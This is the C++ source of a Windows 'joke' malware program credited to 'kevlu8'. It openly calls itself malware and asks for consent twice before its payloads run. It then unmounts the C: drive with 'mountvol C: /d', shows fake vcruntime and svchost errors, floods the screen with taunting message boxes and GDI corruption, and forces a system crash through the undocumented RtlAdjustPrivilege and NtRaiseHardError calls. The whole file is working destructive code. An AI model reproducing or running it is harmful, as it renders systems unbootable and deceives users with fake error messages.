#ifndef UNICODE
#define UNICODE
#endif 

#include <windows.h>
#include <WinUser.h>
#include <iostream>
#include <wingdi.h>
#include <math.h>
#include <stdlib.h>
#include <thread>
#include <processthreadsapi.h>
#include <tlhelp32.h>

typedef NTSTATUS(NTAPI* TFNRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

typedef NTSTATUS(NTAPI* TFNNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask, PULONG_PTR* Parameters, ULONG ValidResponseOption, PULONG Response);

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");

    ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (MessageBoxW(NULL, L"This program is malware; a program that will render your computer unusable and corrupt your data should you run it. \nIf you understand this and wish to continue, press Yes. If you just found this file accidentally and do not want to harm your computer or your files, press No and this program will not execute.", L"WARNING", MB_YESNO | MB_ICONEXCLAMATION) != IDYES || MessageBoxW(NULL, L"THIS IS YOUR LAST WARNING. THE CREATOR (kevlu8) IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED TO YOUR SYSTEM. BY PRESSING THE \"YES\" BUTTON TO THIS MESSAGE BOX, YOUR SYSTEM WILL BE RENDERED UNBOOTABLE AND YOUR PERSONAL FILES WILL BE DELETED. IF YOU UNDERSTAND THIS AND WISH TO EXECUTE THIS MALICIOUS PROGRAM, CLICK YES. OTHERWISE, THIS IS YOUR LAST CHANCE TO BACK OUT BEFORE YOUR FILES ARE GONE.", L"LAST CHANCE BEFORE GIANT FUCKERY", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
    {
        ExitProcess(0);
    }

    //ShowWindow(GetConsoleWindow(), SW_HIDE);

    MessageBoxW(NULL, L"Fatal error: Cannot found vcruntime140.dll. Click OK to terminate the program.", L"Fatal error in Xytharis.exe", MB_TOPMOST | MB_ICONSTOP);

    system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");

    //eject C:
    system("mountvol C: /d");

    DWORD dwVal = 1;

    HKEY hKey;

    //std::thread p1(monitor);
    //std::thread p2(monitor);

    Sleep(10000);

    DWORD dwID2 = 0;
    MSGBOXPARAMS msg2 = { 0 };
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = L"Your computer is now fucked!";
    msg2.lpszCaption = L"Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, 0, &dwID2);

    DWORD dwID1 = 0;
    MSGBOXPARAMS msg1 = { 0 };
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = L"Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = L"Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, 0, &dwID1);

    //memz final payload effect but random
    for (int i = 1; i < 50; i++) {

        //msgbox spam
        DWORD dwID = 0;
        MSGBOXPARAMS msg = { 0 };
        msg.cbSize = sizeof(MSGBOXPARAMS);
        msg.hwndOwner = NULL;
        msg.hInstance = GetModuleHandle(NULL);
        msg.lpszText = L"bet you regret that now huh";
        msg.lpszCaption = L"ez";
        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);


        HWND desktop = GetDesktopWindow();
        HDC desk = GetDC(NULL);
        RECT rect;
        GetWindowRect(desktop, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        StretchBlt(desk, rand() % 100, rand() % 100, w - 100, h - 100, desk, 0, 0, w, h, SRCCOPY);
        Sleep(300 - (4 * i));

        HRGN hRegion1;
        hRegion1 = CreateRectRgn(0, 0, w, h);
        InvertRgn(desk, hRegion1);

    }

    //i have no idea what this does
    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    int w = rect.right - rect.left;
    int h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);


    //random pixels all over the place
    for (int i = 1; i < 200; i++) {
        CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutA(desk, rand() % w, rand() % h, "HAHAHAH UR SCREWED", 18);
        Rectangle(desk, rand() % w, rand() % h, rand() % w, rand() % h);
        Sleep(50);
    }

    MessageBoxW(NULL, L"that was only round 1, have a little brake", L"get ready", MB_OK | MB_ICONSTOP);

    Sleep(10000);

    Ellipse(desk, rand() % w, rand() % h, rand() % w, rand() % h);

    HRGN hRegion;

    hRegion = CreateRectRgn(0, 0, w, h);

    for (int i = 1; i < 100; i++) {
        LineTo(desk, rand() % w, rand() % h);
        SetPixel(desk, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        InvertRgn(desk, hRegion);
        Sleep(50);
    }



    //system("taskkill /f /im svchost.exe"); 
    // ^ lmao that doesnt work mbecause there is no C:\

    if (hNtdll != 0) { //crash system using undocumented methods
        NTSTATUS s1, s2;
        BOOLEAN b;
        ULONG r;

        TFNRtlAdjustPrivilege pfnRtlAdjustPrivilege = (TFNRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        s1 = pfnRtlAdjustPrivilege(19, true, false, &b);

        TFNNtRaiseHardError pfnNtRaiseHardError = (TFNNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
        s2 = pfnNtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, &r);
    }
    return 0;
}